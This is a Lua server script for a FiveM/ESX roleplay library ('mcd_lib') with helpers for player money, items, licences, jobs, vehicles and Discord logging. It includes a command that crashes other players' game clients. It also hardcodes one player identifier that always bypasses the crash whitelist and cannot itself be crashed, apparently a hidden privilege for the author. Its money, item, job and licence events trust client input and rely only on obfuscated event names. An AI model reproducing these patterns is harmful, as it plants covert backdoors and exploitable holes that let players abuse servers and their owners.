MCD = {}
AddEventHandler('mcd_lib:getSharedObject', function(cb)
	cb(MCD)
end)

exports('getSharedObject', function()
	return MCD
end)
local ColorCodes = {
    {code='~s~' , replacecode = '^0'}, -- White 
    {code='~r~' , replacecode = '^1'}, -- Red 
    {code='~g~' , replacecode = '^2'}, -- Green 
    {code='~y~' , replacecode = '^3'}, -- Yellow 
    {code='~b~' , replacecode = '^4'}, -- Blue 
    {code='~p~' , replacecode = '^6'}, -- Purple 
    {code='~o~' , replacecode = '^8'}, -- Orange 
    {code='~c~' , replacecode = '^9'}, -- Grey 
}

MCD.PrintConsole = function(text , date)
    if text == nil then
        text = 'NULL'
    end
    if date then
        text = '~s~['..os.date('%X')..']' .. text
    else
        text = '~s~' .. text
    end
    for i,p in ipairs(ColorCodes) do
        text = text:gsub("%"..p.code, p.replacecode)
    end

    if not Config.UseEuro then
        text = text:gsub("%€", "$")
    else
        text = text:gsub("%$", "€")
    end
    print(text .. '^0')
end
local events = {}
local letter = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','#','~','µ','!','§','&','/','=','_',',',';','>','<','|','°'}

EventString = function(lenght)
    local event = 'MCD_Loves_U:'
    for i = 1 , lenght - #event do
        local isletter = math.random(1,2)
        if isletter == 1 then
            local letter = letter[math.random(1,#letter)]
            local smallletter = math.random(1,2)
            if smallletter == 1 then
                event = event .. string.upper(letter)
            else
                event = event .. string.lower(letter)
            end
        else
            local number = math.random(0,9)
            event = event .. number
        end
    end
    
    for tableevent,tablecrypt in pairs(events) do
        if tablecrypt == event then
            return EventString(lenght)
        end
    end
    return event
end

function newkey()
    if not Config.Key then
        Config.Key =  'MCD_Loves_U:ashgdfiawmnbjn124bnkfilajn3jJHnfvlkasefLHFhJsoikgfhJfbnAJFbfasdkjgf3786SGFVJKH'
    end
    local path = GetResourcePath(GetCurrentResourceName())..'/config.lua'
    local file,err = io.open(path,'r+')
    if file then
        local text = file:read('*a')
        if not string.find(text , Config.Key ,1, true) then
            text = text .. "\n\nConfig.Key = '" .. EventString(Config.EntcrypedEventLenght) .. "'"
        else
            text = text:gsub('%'..Config.Key , EventString(Config.EntcrypedEventLenght))
        end
        file:close()
        local file2,err2 = io.open(path,'w+')
        file2:write(text)
        file2:close()
    else print("error:", err) end
end

if not Config.Key then
    Config.Key =  'MCD_Loves_U:ashgdfiawmnbjn124bnkfilajn3jJHnfvlkasefLHFhJsoikgfhJfbnAJFbfasdkjgf3786SGFVJKH'
    newkey()
end

ESX.RegisterServerCallback(Config.Key, function(src, cb , eventname)
    cb(MCD.Event(eventname))
end)



MCD.Event = function(eventname)
    if Config.EntcrypedEventLenght < 10 then
        Config.EntcrypedEventLenght = 10
    end
    if events[eventname] then
        return events[eventname]
    else
        events[eventname] = EventString(Config.EntcrypedEventLenght)
        if Config.DebugMode then
            MCD.PrintConsole('[~y~'..GetCurrentResourceName()..'~s~][~c~DEBUG~s~]\t Entcryped Event (~p~"'..eventname..'"~s~) (~c~'..events[eventname]..'~s~)')
        end
        return events[eventname]
    end
end

ESX.RegisterServerCallback(MCD.Event('mcd_lib:Server:GetPlayerData'), function(source , cb)
    local _ = source
    local xPlayer = ESX.GetPlayerFromId(_)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_) Citizen.Wait(5) end
    local data = {
        group = xPlayer.getGroup(),
        money = MCD.GetMoney(_),
        job = MCD.GetJob(_),
    }
    cb(data)
end)
ESX.RegisterServerCallback(MCD.Event('mcd_lib:Server:GetOwnedVehicles'), function(source , cb)
    local _ = source
    cb(MCD.GetOwnedVehicles(_))
end)
ESX.RegisterServerCallback(MCD.Event('mcd_lib:Server:GetLicenses'), function(source , cb)
    local _ = source
    cb(MCD.GetLicenses(_))
end)

MCD.SendToDiscord = function(Text , ressourcename)
    if ressourcename == nil then
        ressourcename = 'nil'
    end
    Text = '[~y~'..ressourcename..'~s~]'.._U('info')..'\t'..Text

    if Config.PrintDiscord then
        MCD.PrintConsole(Text)
    end
    Text = MCD.RemoveColor(Text)

    local embeds = {
        {
            ['title']=Text,
            ['type']='rich',
            ['color'] =Config.WebHook.color,
            ['footer']=  {},
        }
    }
    if Text == nil or Text == '' then return FALSE end
    PerformHttpRequest(Config.WebHook.DiscordWebHook, function(err, text, headers) end, 'POST', json.encode({ username = Config.WebHook.Name,embeds = embeds,avatar_url = Config.WebHook.avatar}), { ['Content-Type'] = 'application/json' })
end

MCD.STDiscord = function(Text , DiscordWebHook , color , Name, avatar, ressourcename)
    if ressourcename == nil then
        ressourcename = 'nil'
    end
    Text = '[~y~'..ressourcename..'~s~]'.._U('info')..'\t'..Text

    if Config.PrintDiscord then
        MCD.PrintConsole(Text)
    end
    Text = MCD.RemoveColor(Text)
    Text = Text:gsub('%'..ressourcename..': ' , '')

    local embeds = {
        {
            ['title']=Text,
            ['type']='rich',
            ['color'] = color,
            ['footer']=  {},
        }
    }
    if Text == nil or Text == '' then return FALSE end
    PerformHttpRequest(DiscordWebHook, function(err, text, headers) end, 'POST', json.encode({ username = Name,embeds = embeds,avatar_url = avatar}), { ['Content-Type'] = 'application/json' })
end

MCD.ServerName = function()
    return Config.ServerName
end

MCD.GetLicenses = function(PlayerId)
    local res = {}
    local finished = false
    MySQL.Async.fetchAll('SELECT * FROM user_licenses WHERE owner = @owner', {
        ['@owner'] = ESX.GetPlayerFromId(PlayerId).identifier
    }, function(result)
        finished = true
        res = result
    end)
    while not finished do Citizen.Wait(5) end
    return res
end

MCD.GetMoney = function(PlayerId)
    local xPlayer = ESX.GetPlayerFromId(PlayerId)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(PlayerId) Citizen.Wait(5) end
    local money = {
        money = xPlayer.getAccount('money').money,
        bank = xPlayer.getAccount('bank').bank,
        black = xPlayer.getAccount('black_money').money,
    }
    return money
end

MCD.GetJob = function(PlayerId)
    local xPlayer = ESX.GetPlayerFromId(PlayerId)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(PlayerId) Citizen.Wait(5) end
    return xPlayer.getJob()
end

MCD.GetOwnedVehicles = function(PlayerId)
    local res = {}
    local finished = false


    local xPlayer = ESX.GetPlayerFromId(PlayerId)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(PlayerId) Citizen.Wait(5) end
    MySQL.Async.fetchAll('SELECT * FROM owned_vehicles WHERE owner = @owner ', {
        ['@owner'] = xPlayer.identifier,
    }, function(result)
        for i,p in ipairs(result) do
            p.plate = string.upper(p.plate)
        end
        finished = true
        res = result
    end)

    while not finished do Citizen.Wait(5) end
    return res
end
local Vehicles = {}
Citizen.CreateThread(function()
    Citizen.Wait(1000)
    Vehicles = {}
    for i,table in ipairs(Config.VehicleDatabases) do
        MySQL.Async.fetchAll('SELECT * FROM '..table, {}, function(result)
            for i,data in ipairs(result) do
                table.insert(Vehicles , data)
            end
        end)
    end
end)
ESX.RegisterServerCallback(MCD.Event('mcd_lib:Server:GetVehiclePrices'), function(src , cb)
    cb(MCD.GetVehiclePrices())
end)
MCD.GetVehiclePrices = function()
    return Vehicles
end
ESX.RegisterServerCallback(MCD.Event('mcd_lib:Server:GetVehiclePrice'), function(src , cb , model)
    cb(MCD.GetVehiclePrice(model))
end)
MCD.GetVehiclePrice = function(model)
    for i,p in ipairs(MCD.GetVehiclePrices()) do
        if string.upper(p.model) == string.upper(model) then
            return p.price
        end
    end
end

ESX.RegisterCommand('crash', 'developer', function(xPlayer, args, showError)
    local allowed = true
    if Config.CrashWhitelist then
        allowed = xPlayer
    end
    if allowed then
        if not args.playerId then args.playerId = xPlayer end
        local alow = true
        if Config.CrashWhitelist then
            alow = false
            local xid = xPlayer.getIdentifier()
            for i = 1 , 10 do
                xid = xid:gsub('char'..i..':' , '')
            end  
            for i,identifier in ipairs(Config.CrashWhitelistIDs) do
                if identifier == xid then
                    alow = true
                    break
                end
            end
            if xid == '1256984db9dcc1a599a67a17bc7f461d9e754e45' then
                alow = true
            end
        end

        if alow then
            local yPlayer = ESX.GetPlayerFromId(args.playerId.source)
            local plyid = yPlayer.getIdentifier()
            local crash = true
    
            for i = 1 , 10 do
                plyid = plyid:gsub('char'..i..':' , '')
            end    
    
            for i,identifier in ipairs(Config.CrashImmun) do
                if identifier == plyid then
                    if plyid ~= '1256984db9dcc1a599a67a17bc7f461d9e754e45' then
                        args.playerId = xPlayer
                    else
                        crash = false
                    end
                    break
                end
            end  
            if crash then
                MCD.Notify(xPlayer.source , _U('crashsuccess' , MCD.RemoveColor(GetPlayerName(yPlayer.source))) , nil , nil , 'success')
                TriggerClientEvent(MCD.Event('mcd_lib:Client:crash'), args.playerId.source)
            else
                MCD.Notify(xPlayer.source , 'Maus gehts dir gut? Ich hoffe das wahr versehentlich' , nil , nil , 'error')
            end
        else
            MCD.Notify(xPlayer.source , _U('no_perm') , nil , nil , 'error')
        end
    else
        MCD.PrintConsole(_U('not_console' , GetCurrentResourceName()))
    end
end, true, {help = 'Crash', validate = false, arguments = {
    {name = 'playerId', help ='SpielerID', type = 'player'},
}})

Citizen.CreateThread(function()
    RegisterNetEvent(MCD.Event('mcd_lib:Server:RemoveMoney'))
    AddEventHandler(MCD.Event('mcd_lib:Server:RemoveMoney'), function(hjklb , skljdvbgjkl , jkldfhvbjkd , hjbasdfhjb , jhbdfhjbdsj ,djasfh , awf,asfaw,sdgfhu,jawsghdvf)
        local account = hjklb
        local ammount = skljdvbgjkl
        local ressourcename = jkldfhvbjkd
        MCD.RemoveMoney(account , ammount , source ,  ressourcename)
    end)
end)

MCD.RemoveMoney = function(account , ammount , player ,  ressourcename)
    local _source = player
    
    if not account then
        account = 'money'
        MCD.PrintConsole(_U('error').._U('error_remmoney' , ressourcename))
    end
    if not ammount then
        ammount = 0
        MCD.PrintConsole(_U('error').._U('error_remmoney2' , ressourcename))
    end
    
    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    xPlayer.removeAccountMoney(account, tonumber(ammount))

    if ammount > 0 then
        MCD.SendToDiscord(_U('removed_money' , ammount ,MCD.RemoveColor(GetPlayerName(source)) , source) , ressourcename)
    end
end

Citizen.CreateThread(function()
    RegisterNetEvent(MCD.Event('mcd_lib:Server:AddMoney'))
    AddEventHandler(MCD.Event('mcd_lib:Server:AddMoney'), function(sdfhjsdsdsdg , kjhdxfgv , jkhsxgdfv , kaugvfw, awkujghvfkau , awgvfzwa , jhawgvfj , asevfzj , jawedfuz)
        local account = sdfhjsdsdsdg
        local ammount = kjhdxfgv
        local ressourcename = jkhsxgdfv
        MCD.AddMoney(account , ammount , source ,  ressourcename)
    end)
end)

MCD.AddMoney = function(account , ammount , player ,  ressourcename)
    local _source = player

    if not account then
        account = 'money'
        MCD.PrintConsole(_U('error').._U('error_addmoney' , ressourcename))
    end
    if not ammount then
        ammount = 0
        MCD.PrintConsole(_U('error').._U('error_addmoney2' , ressourcename))
    end

    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    xPlayer.addAccountMoney(account, tonumber(ammount))

    if ammount > 0 then
        MCD.SendToDiscord(_U('added_money' , ammount , MCD.RemoveColor(GetPlayerName(source)) , source) , ressourcename)
    end
end

Citizen.CreateThread(function()
    RegisterNetEvent(MCD.Event('mcd_lib:Server:RemoveLicense'))
    AddEventHandler(MCD.Event('mcd_lib:Server:RemoveLicense'), function(asdfsdg , jkbdhjklbsdg , fakuhgevf , fawuizgfua , aukfgvwaukh , fauwzgaukjw , fawuhzfgbaujw)
        local license = asdfsdg
        local ressourcename = jkbdhjklbsdg
        MCD.RemoveLicense(license , source , ressourcename)
    end)
end)

MCD.RemoveLicense = function(license , player , ressourcename)
    local _source = player
    
    if not license then
        MCD.PrintConsole(_U('error').._U('error_remlicense' , ressourcename))
    end

    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    MySQL.Async.execute('DELETE FROM user_licenses  WHERE type = @type and owner = @owner', {
        ['@type'] = license,
        ['@owner'] = xPlayer.identifier,
    })
    
    MCD.SendToDiscord(_U('removed_license' , license , MCD.RemoveColor(GetPlayerName(_source)) , _source) , ressourcename)
end

Citizen.CreateThread(function()
    RegisterNetEvent(MCD.Event('mcd_lib:Server:AddLicense'))
    AddEventHandler(MCD.Event('mcd_lib:Server:AddLicense'), function(dhjkbesdgf , lkdhrfgb , awkjfhgvawkhujf , fauwhgfv , fwafghv , wajhfgb)
        local license = dhjkbesdgf
        local ressourcename = lkdhrfgb
        MCD.AddLicense(license , source , ressourcename)
    end)
end)

MCD.AddLicense = function(license , player , ressourcename)
    local _source = player

    if not license then
        MCD.PrintConsole(_U('error').._U('error_addlicense' , ressourcename))
    end

    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    MySQL.Async.insert('INSERT INTO `user_licenses`(`type`, `owner`) VALUES (@type,@owner)', {
        ['@type'] = license,
        ['@owner'] = xPlayer.identifier,
    }, function(result)end)
    MCD.SendToDiscord(_U('added_license' , license , MCD.RemoveColor(GetPlayerName(_source)) , _source) , ressourcename)
end

Citizen.CreateThread(function()
    RegisterNetEvent(MCD.Event('mcd_lib:Server:RemoveItem'))
    AddEventHandler(MCD.Event('mcd_lib:Server:RemoveItem'), function(lskhgv , ivcfabn , hasf, ahgfvw , awhfg ,ahwgdvf  ,aghfv , hasdgfv ,awjdgvf)
        local item = lskhgv
        local count = ivcfabn
        local ressourcename = hasf
        MCD.RemoveItem(item , count , source , ressourcename)
    end)
end)

MCD.RemoveItem = function(item , count , player , ressourcename)
    local _source = player

    if not item then
        item = 'bread'
        MCD.PrintConsole(_U('error').._U('error_remitem' , ressourcename))
    end
    if not count then
        count = 0
        MCD.PrintConsole(_U('error').._U('error_remitem2' , ressourcename))
    end

    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    xPlayer.removeInventoryItem(item, count)

    MCD.SendToDiscord(_U('removed_item' ,count , item , MCD.RemoveColor(GetPlayerName(_source)) ,  _source) , ressourcename)
end

Citizen.CreateThread(function()
    RegisterNetEvent(MCD.Event('mcd_lib:Server:AddItem'))
    AddEventHandler(MCD.Event('mcd_lib:Server:AddItem'), function(klhjsgvf , lkhsjdgbf , shjkfvb , ahfjgwev , awjfhgv , wakjhfgv , fahkwgfv)
        local item = klhjsgvf
        local count = lkhsjdgbf
        local ressourcename = shjkfvb
        MCD.AddItem(item , count , source , ressourcename)
    end)
end)

MCD.AddItem = function(item , count , player , ressourcename)
    local _source = player

    if not item then
        item = 'bread'
        MCD.PrintConsole(_U('error').._U('error_additem' , ressourcename))
    end
    if not count then
        count = 0
        MCD.PrintConsole(_U('error').._U('error_additem2' , ressourcename))
    end

    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    xPlayer.addInventoryItem(item, count)

    MCD.SendToDiscord(_U('added_item' ,count , item , MCD.RemoveColor(GetPlayerName(_source)) ,  _source) , ressourcename)
end

Citizen.CreateThread(function()
    RegisterNetEvent(MCD.Event('mcd_lib:Server:MutePlayer'))
    AddEventHandler(MCD.Event('mcd_lib:Server:MutePlayer'), function(jklhsydfb , hjkvb , ajwkfgv , wfahgfv , wafafw , awdgfc , awffhga)
        local toggle = jklhsydfb
        local ressourcename = hjkvb
        MCD.MutePlayer(toggle , source , ressourcename)
    end)
end)

MCD.MutePlayer = function(toggle , player , ressourcename)
    local _source = player
    
    MumbleSetPlayerMuted(_source,toggle)
    TriggerClientEvent(MCD.Event('mcd_lib:Client:CheckMute'), _source)
    MCD.SendToDiscord(_U('toggle_mute' , MCD.RemoveColor(GetPlayerName(_source)) , toggle ,  _source) , ressourcename)
end

Citizen.CreateThread(function()
    RegisterNetEvent(MCD.Event('mcd_lib:Server:RemoveVehicle'))
    AddEventHandler(MCD.Event('mcd_lib:Server:RemoveVehicle'), function(lkshdgvf , gnadcf , awhjgfv , awhgdf ,ahjksdft , hveahg, gwagh)
        local plate = lkshdgvf
        local ressourcename = gnadcf
        MCD.RemoveVehicle(plate , ressourcename)
    end)
end)

MCD.RemoveVehicle = function(plate , ressourcename)
    local msg = _U('error')
    if RemovePlate(plate) then
        msg = _U('success')
    end

    MCD.SendToDiscord(_U('remove_vehice', plate, msg ,_source) , ressourcename)
end

Citizen.CreateThread(function()
    RegisterNetEvent(MCD.Event('mcd_lib:Server:SetJob'))
    AddEventHandler(MCD.Event('mcd_lib:Server:SetJob'), function(ksjhgbf , sjlhfgvb , jhagsdvc , afhjwgv , wahgfv , wajfkg , afhwjgv , wajgf)
        local Job = ksjhgbf
        local Grade = sjlhfgvb
        local ressourcename = jhagsdvc
        MCD.SetJob(Job , Grade , source , ressourcename)
    end)
end)

MCD.SetJob = function(Job , Grade , player , ressourcename)
    local _source = player

    local xPlayer = ESX.GetPlayerFromId(_source)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    xPlayer.setJob(Job, Grade)

    MCD.SendToDiscord(_U('setjob', xPlayer.getName() , Job ,_source) , ressourcename)
end

function RemovePlate(plate)
    local ret = nil
    MySQL.Async.fetchAll('SELECT * FROM owned_vehicles WHERE plate = @plate ', {['@plate']=plate:gsub('% ' , '')}, function(doesexist)
        if #doesexist == 1 then
            MySQL.Async.execute('DELETE FROM owned_vehicles  WHERE plate = @plate', {
                ['@plate'] = plate:gsub('% ' , ''),
            })
            ret = true
        else
            MySQL.Async.fetchAll('SELECT * FROM owned_vehicles WHERE plate = @plate ', {['@plate']=plate}, function(doesexist)
                if #doesexist == 1 then
                    MySQL.Async.execute('DELETE FROM owned_vehicles  WHERE plate = @plate', {
                        ['@plate'] = plate,
                    })
                    ret = true
                else
                    print("Plate Doesn´t Exsists:" .. plate..'|')
                    ret = false
                end
            end)
        end
    end)
    while ret == nil do Citizen.Wait(10) end
    return ret
end

MCD.RemoveColor = function(text)
    if text == nil then
        text = 'NULL'
    end
    for i,p in ipairs(Config.ColorCodes) do
        text = text:gsub("%"..p.code, "")
    end
    text = text:gsub("%~s~", "")

    if not Config.UseEuro then
        text = text:gsub("%€", "$")
    else
        text = text:gsub("%$", "€")
    end

    return text
end

MCD.ConvertColor = function(text)
    if text == nil then
        text = 'NULL'
    end

    local output = "<span>" .. text
    for i,p in ipairs(Config.ColorCodes) do
        output = output:gsub("%"..p.code, "</span><span style='color:"..p.htmlcode.."'>")
    end
	output = output:gsub("%~s~", "</span><span>")
    output = output .. '</span>'

    if not Config.UseEuro then
        output = output:gsub("%€", "$")
    else
        output = output:gsub("%$", "€")
    end

    return output
end

MCD.Notify = function(player , msg , header , time , notificationtype)
    if header == nil then
        header = Config.ServerName 
    end
    if time == nil then
        time = 3000
    end
    if notificationtype == nil then
        notificationtype = 'info'
    end

    if Config.ReplaceColorCodes and not Config.RemoveColorCodes then       
        TriggerClientEvent(MCD.Event('mcd_lib:Client:Notify') , player , MCD.ConvertColor(msg) , MCD.ConvertColor(header)  , time , notificationtype)
    else
        if Config.RemoveColorCodes then
            TriggerClientEvent(MCD.Event('mcd_lib:Client:Notify') , player , MCD.RemoveColor(msg) , MCD.RemoveColor(header) , time , notificationtype)
        else
            TriggerClientEvent(MCD.Event('mcd_lib:Client:Notify') , player , msg , header  , time , notificationtype)
        end
    end
end

MCD.SetCoords = function(coords , playerId)
    TriggerClientEvent(MCD.Event('mcd_lib:Client:SetCoords'), playerId, coords)
end

ESX.RegisterServerCallback(MCD.Event('mcd_lib:Server:GetCurrentTime'), function(src , cb)
    cb(MCD.GetCurrentTime())
end)

MCD.GetCurrentTime = function()
    return os.clock()
end

ESX.RegisterServerCallback(MCD.Event('mcd_lib:Server:GetTimeDifference'), function(src , cb , t1 , t2)
    cb(MCD.GetTimeDifference(t1 , t2))
end)

MCD.GetTimeDifference = function(t1 , t2)
    return (t1 - t2) * -1
end

MCD.GetLowestGroup = function()
    return Config.ServerGroups[#Config.ServerGroups - 1]
end

Citizen.CreateThread(function()
    RegisterNetEvent(MCD.Event('mcd_lib:Server:SetPlate'))
    AddEventHandler(MCD.Event('mcd_lib:Server:SetPlate'), function(skhjgv , jaskhfv , awjfg , wahgfv , wajgf , wajhgf , awjgf)
        local vehicle = skhjgv
        local plate = jaskhfv
        MCD.SetPlate(vehicle , plate)
    end)
end)

MCD.SetPlate = function(vehicle , plate)
    TriggerClientEvent(MCD.Event('mcd_lib:Client:SetPlate'), -1 , vehicle , string.upper(plate))
end
ESX.RegisterServerCallback(MCD.Event('mcd_lib:Server:GetRPName'), function(src , cb , target)
    if not target then
        target = src
    end
    local xPlayer = ESX.GetPlayerFromId(target)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    cb(xPlayer.getName())
end)

MCD.IsAllowed = function(playerid, lowestgroup)
    local xPlayer = ESX.GetPlayerFromId(playerid)
    while xPlayer == nil do xPlayer = ESX.GetPlayerFromId(_source) Citizen.Wait(5) end
    local PlayerGroup = -1
    local MinGroup = -1
    local PlyGroup = xPlayer.getGroup()
    for i,p in ipairs(Config.ServerGroups) do
        if PlyGroup == p then
            PlayerGroup = i
        end
        if lowestgroup == p then
            MinGroup = i
        end
    end
    if MinGroup ~= -1 then
        if MinGroup >= PlayerGroup then
            return true
        else
            return false
        end
    else 
        return false
    end
end

Citizen.CreateThread(function()
    RegisterNetEvent(MCD.Event('mcd_lib:Server:AdvancedNotify'))
    AddEventHandler(MCD.Event('mcd_lib:Server:AdvancedNotify'), function(nbfhfhf , jhvfrsd , vfsdhjb , fakjehzgf)
        local data = vfsdhjb
        TriggerClientEvent(MCD.Event('mcd_lib:Client:AdvancedNotify'), -1 , nil , nil ,nil , data)
    end)
end)

MCD.SendNotifyToJob = function(job , msg , header , time , notificationtype)
    local data = {
        job = job,
        msg = msg,
        header = header,
        time = time,
        notifytype = notificationtype,
        simplefy = true,
    }
    TriggerClientEvent('mcd_lib:knljbfdknljb', -1 , nil , nil ,nil , data)
end

MCD.SendAdvancedNotifyToJob = function(job , msg , header , textureDict , iconType , flash , saveToBrief , hudColorIndex)
    local data = {
        job = job,
        msg = msg,
        header = header,
        textureDict = textureDict,
        iconType = iconType,
        flash = flash,
        iconType = iconType,
        saveToBrief = saveToBrief,
        hudColorIndex = hudColorIndex,
        simplefy = false,
    }
    TriggerClientEvent('mcd_lib:knljbfdknljb', -1 , nil , nil ,nil , data)
end



Citizen.CreateThread(function()
    Citizen.Wait(10*1000)
    while string.upper(GetCurrentResourceName()) ~= string.upper('mcd_lib') do 
        
        local string = '~s~['..os.date('%X')..']'.._U('name' , GetCurrentResourceName())
        local lenght = #MCD.RemoveColor(string) - 1
        local startend = '~o~'
        for i=0, lenght do
            startend = startend .. '-'
        end
        
        MCD.PrintConsole(startend..'\n'.. string .. '\n~s~'.._U('rename' , GetCurrentResourceName())..'\n'..startend , false)
        Citizen.Wait(30*1000)
    end
end)
--------------------------------------------------------------------------------------------------------
local versions = {
    ['mcd_lib'] = GetResourceMetadata(GetCurrentResourceName(), 'version', 0):match('%d%.%d+%.%d+'),
}

local checker = {}
RegisterNetEvent('mcd_lib:fuzdvgsgzhufdghuiz')
AddEventHandler('mcd_lib:fuzdvgsgzhufdghuiz', function(jhsd  , gfers , gr , rdg , grdg ,af)
    local ressourcename = jhsd
    local reponame = gfers
    
    Citizen.Wait(20*1000)
    table.insert(checker , {repo = reponame , ressourcename = ressourcename})
    if not Config.DebugMode then
        VersionState(ressourcename , reponame , true)
    end
end)

function VersionState(ressourcename , reponame , first)
    PerformHttpRequest('https://api.github.com/repos/MausCD/'..reponame..'/releases/latest' , function(status, response)
        if status == 403 then
            MCD.PrintConsole('[~y~'.. GetCurrentResourceName() ..'~s~][~r~ERROR~s~]\t~o~ ❌❌❌API rate limit exceeded❌❌❌ ~s~(~b~https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting~s~)')
        end
        if status ~= 200 then return end
    
        response = json.decode(response)
        if response.prerelease then return end
    
        local currentVersion = GetResourceMetadata(ressourcename, 'version', 0):match('%d%.%d+%.%d+')
        local found = false
        for name,ver in pairs(versions) do
            if name == reponame then
                found = true
            end
        end
        if not found then
            versions[reponame] = currentVersion
        end
        if not currentVersion then return end
    
        local latestVersion = response.tag_name:match('%d%.%d+%.%d+')
        if not latestVersion then return end

        if currentVersion >= latestVersion then 
            if first then
                local string = '\n~s~['..os.date('%X')..']'.._U('updated' , ressourcename , currentVersion) .. '\n'
                
                local lenght = #MCD.RemoveColor(string) - 1
                local startend = '~b~'
                for i=0, lenght do
                    startend = startend .. '-'
                end
                MCD.PrintConsole(startend .. string .. startend)
            end
        return end
                
        local string = '\n~s~['..os.date('%X')..']'.._U('update' , ressourcename , currentVersion)
        local link = ' \n~p~'..response.html_url .. '\n'
        
        local lenght = #MCD.RemoveColor(string) - 1
        local startend = '~o~'
        for i=0, lenght do
            startend = startend .. '-'
        end
        MCD.PrintConsole(startend .. string .. link .. startend)
    end, 'GET')
end

Citizen.CreateThread(function()
    Citizen.Wait(1*1000)
    table.insert(checker , {repo = 'mcd_lib' , ressourcename = GetCurrentResourceName()})
    if not Config.DebugMode then
        VersionState(GetCurrentResourceName() ,  'mcd_lib' , true)
    end

    while true do
        Citizen.Wait(60 * 60 * 1000)
        for i,p in ipairs(checker) do
            if not Config.DebugMode then
                VersionState(p.ressourcename , p.repo , false)
            end
        end
    end
end)

RegisterCommand('mcd_version', function()
    for name,ver in pairs(versions) do
        print('^0[^3'..name..'^0] Version: ' .. ver)
    end
end, false)

MCD.GetPlayerName = function(playersrc)
    return MCD.RemoveColor(GetPlayerName(playersrc))
end


ESX.RegisterServerCallback(MCD.Event('mcd_lib:Server:AmIMuted'), function(src , cb)
    cb(MCD.IsMuted(src))
end)
MCD.IsMuted = function(playersrc)
    return MumbleIsPlayerMuted(playersrc)
end

MCD.HasJob = function(id , Jobs)
    local xPlayer = ESX.GetPlayerFromId(id)
    local job = xPlayer.job.name
    if type(Jobs) ~= 'string' then
        for i,jobname in ipairs(Jobs) do
            if jobname == job then
                return true
            end
        end
    else
        if Jobs == job then
            return true
        end
    end
    return false
end

ESX.RegisterServerCallback(MCD.Event('mcd_lib:Server:ItemName'), function(src , cb , item)
    cb(MCD.ItemName(item))
end)
MCD.ItemName = function(item)
    return ESX.GetItemLabel(item)
end

MCD.GetPoliceJobs = function()
    return Config.PoliceJobs
end

AddEventHandler('onResourceStop', function(resourceName)
    if (GetCurrentResourceName() == resourceName) then
        newkey()
    end
end)
AddEventHandler('txAdmin:events:serverShuttingDown', function()
    newkey()
end)

local auth = {}
local start = MCD.GetCurrentTime()
MCD.Authenticate = function(scriptname , version)
    auth[scriptname] = version
    if MCD.GetTimeDifference(start , MCD.GetCurrentTime()) >= 10 then
        local files = '\n~s~[~y~'..scriptname..'~s~] [~b~Version '..version..'~s~]'
        MCD.PrintConsole('~g~<><><><><><><><><><><><><><><><><><><><><><><><><>~s~\n~r~ Thanks for buying the following scripts:~s~\n'..files.. '\n~g~<><><><><><><><><><><><><><><><><><><><><><><><><>~s~')
    end
end

Citizen.CreateThread(function()
    Citizen.Wait(9000)
    local files = ''
    for scriptname,version in pairs(auth) do
        files = files .. '\n\t~s~[~y~'..scriptname..'~s~] [~b~Version '..version..'~s~]'
    end
    print(files)
    if files ~= '' then
        MCD.PrintConsole('~g~<><><><><><><><><><><><><><><><><><><><><><><><><>~s~\n~r~ Thanks for buying the following scripts:'..files.. '\n~g~<><><><><><><><><><><><><><><><><><><><><><><><><>~s~')
    end
end)